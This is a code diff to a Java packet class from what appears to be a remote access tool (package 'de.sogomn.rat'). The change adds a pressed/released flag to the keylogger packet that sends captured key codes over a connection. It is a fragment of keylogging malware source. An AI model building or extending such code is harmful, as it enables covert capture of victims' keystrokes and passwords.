@@ -23,23 +23,30 @@ import de.sogomn.rat.ActiveConnection;
 public final class KeylogPacket implements IPacket {
 	
 	private int keyCode;
+	private byte flag;
 	
-	public KeylogPacket(final int keyCode) {
+	public static final byte PRESSED = 0;
+	public static final byte RELEASED = 1;
+	
+	public KeylogPacket(final int keyCode, final byte flag) {
 		this.keyCode = keyCode;
+		this.flag = flag;
 	}
 	
 	public KeylogPacket() {
-		this(NativeKeyEvent.VC_UNDEFINED);
+		this(NativeKeyEvent.VC_UNDEFINED, (byte)-1);
 	}
 	
 	@Override
 	public void send(final ActiveConnection connection) {
 		connection.writeInt(keyCode);
+		connection.writeByte(flag);
 	}
 	
 	@Override
 	public void receive(final ActiveConnection connection) {
 		keyCode = connection.readInt();
+		flag = connection.readByte();
 	}
 	
 	@Override
@@ -49,6 +56,10 @@ public final class KeylogPacket implements IPacket {
 	
 	public int getKeyCode() {
 		return keyCode;
+	}
+	
+	public byte getFlag() {
+		return flag;
 	}
 	
 }
